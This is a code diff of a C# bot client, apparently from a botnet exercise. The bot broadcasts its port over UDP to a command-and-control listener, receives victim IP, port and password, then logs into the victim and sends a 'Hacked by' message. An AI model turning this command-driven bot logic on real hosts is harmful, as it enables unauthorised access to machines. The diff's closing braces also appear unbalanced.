@@ -13,30 +13,37 @@ namespace bot
     {
         private readonly string newline_delimeter = "\r\n";
         Thread broadcast_thread;
-        private String hacked_message = "Hacked by Hadas!\r\n";
+        private String hacked_message = "Hacked by ";
         private int listening_port;
-        private static System.Timers.Timer timer;
-        private IPAddress brodcast = IPAddress.Parse("255.255.255.255");
-        UdpClient listener;
-        IPEndPoint localEndPoint;
-        Socket udp_socket;
+        private int sending_port;
+        string brodcast = "255.255.255.255";
+        private int cc_port = 2019;
+        private static object sync_lock = new object();
+        private static object port_lock = new object();
 
         public BotServer()
         {
-            //initial();
-            //broadcast_thread = new Thread(new ThreadStart(activate_timer));
-            //listening_to_bot();
-            attack("192.168.0.26", 2019, "passssap");
+
+            lock (port_lock) {
+                UdpClient client_for_reciving = new UdpClient(0);
+                listening_port = ((IPEndPoint)client_for_reciving.Client.LocalEndPoint).Port;
+                client_for_reciving.Close();
+                UdpClient client_for_sending = new UdpClient(0);
+                sending_port = ((IPEndPoint)client_for_sending.Client.LocalEndPoint).Port;
+                client_for_sending.Close();
+
+            }
+
         }
 
-        public void initial()
+        public void start()
         {
-            //initial
-            Random random = new Random();
-            listening_port = random.Next(1000, 9999);
-            Console.Write(listening_port);//for fun
+            broadcast_thread = new Thread(new ThreadStart(activate_timer));
+            broadcast_thread.Start();
+            listening_to_bot();
+            int t = Console.Read();
         }
-
+        
         public void activate_timer()
         {
             //timer - bot announcement
@@ -47,55 +54,64 @@ namespace bot
             timer.Enabled = true;
         }
 
+        public void bot_announcement(Object source, System.Timers.ElapsedEventArgs e)
+        {
+            lock (sync_lock)
+            {
+                UdpClient client_udp = new UdpClient();
+                IPEndPoint ip = new IPEndPoint(IPAddress.Any, sending_port);
+                byte[] bytes = BitConverter.GetBytes((UInt16)listening_port);
+                client_udp.Client.Bind(ip);
+                client_udp.Send(bytes, bytes.Length, brodcast, cc_port);
+                client_udp.Close();
+            }
+        }
+
         public void listening_to_bot()
         {
             bool done = false;
-            listener = new UdpClient(listening_port);
-            localEndPoint = new IPEndPoint(IPAddress.Parse("172.16.15.50"), listening_port);
-            udp_socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
-            string received_data;
-            byte[] receive_byte_array;
             try
             {
                 while (!done)
                 {
-                    Console.WriteLine("Waiting for broadcast");
-                    receive_byte_array = listener.Receive(ref localEndPoint);
-                    String massage = localEndPoint.ToString();
-                    Console.WriteLine("Received a broadcast from {0}", massage);
-                    String[] information = massage.Split(',');
-                    if (information.Length > 2)
+                    UdpClient client = new UdpClient(listening_port);
+                    IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);
+                    byte[] bytes = client.Receive(ref sender);
+                    client.Close();
+                    Byte[] victim_ip_b = new Byte[4];
+                    Array.Copy(bytes, 0, victim_ip_b, 0, 4);
+                    Byte[] victim_port_b = new Byte[2];
+                    Array.Copy(bytes, 4, victim_port_b, 0, 2);
+                    Byte[] victim_pass_b = new Byte[6];
+                    Array.Copy(bytes, 6, victim_pass_b, 0, 6);
+                    Byte[] cnn_name_b = new Byte[32];
+                    Array.Copy(bytes, 12, cnn_name_b, 0, 32);
+                    try
                     {
-                        String ip_address = information[0];
-                        int port;
-                        try
-                        {
-                            port = Int32.Parse(ip_address);
-                        } catch (Exception e) {
-                            port = -1;
-                        }
-                        String password = information[2];
-                        attack(ip_address, port, password);
+                        String victim_ip = (new IPAddress(victim_ip_b)).ToString();
+                        int victim_port = BitConverter.ToUInt16(victim_port_b, 0);
+                        String victim_pass = Encoding.ASCII.GetString(victim_pass_b, 0, victim_pass_b.Length);
+                        String cnn_name = Encoding.ASCII.GetString(cnn_name_b, 0, cnn_name_b.Length);
+                        Thread attack_t = new Thread(() =>attack(victim_ip, victim_port, victim_pass, cnn_name));
+                        attack_t.Start();
+
                     }
-                    /*received_data = Encoding.ASCII.GetString(receive_byte_array, 0, receive_byte_array.Length);
-                    Console.WriteLine("data follows \n{0}\n\n", received_data);*/
+                    catch (Exception e)
+                    {
+
+                    }
                 }
             }
-            catch (Exception e)
+            catch (SocketException e)
             {
-                Console.WriteLine(e.ToString());
+                Console.WriteLine("there was an error reciving port: " +listening_port + " sending port :" +sending_port );
             }
-            listener.Close();
-        }
-
-        public void bot_announcement(Object source, System.Timers.ElapsedEventArgs e)
-        {
-            IPEndPoint ipep = new IPEndPoint(brodcast, 31337);
-            udp_socket.Connect(ipep);
-            String port = listening_port.ToString();
-            byte[] buffer = Encoding.ASCII.GetBytes(port);
-            udp_socket.Send(buffer, 4, SocketFlags.None);
-        }
+            finally
+            {
+             //   listener.Close();
+            }
+        
+    }
 
         private bool reached_message_end(byte[] rcv_buffer, int offset, int readBytes)
         {
@@ -110,7 +126,7 @@ namespace bot
             }
         }
 
-        private string receive(Socket client, int msg_size)
+        private string receive(Socket client,int msg_size)
         {
             string ans = "";
             byte[] rcv_buffer = new byte[msg_size];
@@ -129,7 +145,7 @@ namespace bot
             return ans;
         }
 
-        public void attack(string ip, int port, string pass)
+        public void attack(string ip, int port, string pass, String cnn_name)
         {
             if (port > -1) {
                 IPAddress victimAddress = IPAddress.Parse(ip);
@@ -147,17 +163,17 @@ namespace bot
                         response = receive(server, 100);
                         if (String.Equals(response, "Access granted", StringComparison.OrdinalIgnoreCase))
                         {
-                            buffer = Encoding.ASCII.GetBytes(hacked_message + "\r\n");
-                            server.Send(buffer, hacked_message.Length, SocketFlags.None);
-                            int i = 10;
+                            String send_mssg = hacked_message + cnn_name + "\r\n";
+                            buffer = Encoding.ASCII.GetBytes(send_mssg);
+                            server.Send(buffer, send_mssg.Length, SocketFlags.None);
                         }
                     }
                     catch (Exception e) { }
                 }
-                catch (Exception e) { }
-
-            }
-
+                catch(Exception e) { }
+            
         }
+
     }
 }
+    }
